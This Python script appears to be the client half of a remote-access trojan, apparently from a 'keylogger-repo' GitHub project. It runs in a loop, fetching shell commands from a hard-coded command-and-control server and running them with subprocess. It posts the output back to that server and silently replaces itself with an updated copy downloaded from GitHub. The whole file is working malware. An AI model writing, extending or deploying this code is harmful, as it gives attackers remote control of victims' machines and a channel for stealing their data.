import requests
import subprocess
import time
import os
import sys

# Constants
SERVER_URL = 'http://192.168.15.16:5000'  # Server IP
GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
LOCAL_PATH = os.path.abspath(__file__)

def check_for_updates():
    try:
        response = requests.get(GITHUB_URL)
        response.raise_for_status()
        with open(LOCAL_PATH, 'rb') as current_file:
            current_version = current_file.read()
        if current_version != response.content:
            with open(LOCAL_PATH, 'wb') as f:
                f.write(response.content)
            # Restart script after updating
            os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        print(f"Update check failed: {e}")

def communicate_with_server():
    try:
        req = requests.get(SERVER_URL, timeout=5)
        c2_command = req.text
        print(f'[Client] Received command: {c2_command}')  # For debugging purposes
        if 'terminate' in c2_command:
            print('[Client] Terminate command received. Exiting...')
            sys.exit()
        else:
            CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            response = CMD.stdout.read()
            print(f'[Client] Sending response: {response.decode()}')  # For debugging purposes
            requests.post(SERVER_URL, data=response)
    except (requests.ConnectionError, requests.Timeout):
        print("[Client] Server not available. Reconnecting...")

if __name__ == "__main__":
    # Continuous loop for checking server and updating
    while True:
        # Check for updates on GitHub
        check_for_updates()
        
        # Attempt communication with the server
        communicate_with_server()
        
        # Sleep to avoid spamming requests
        time.sleep(10)
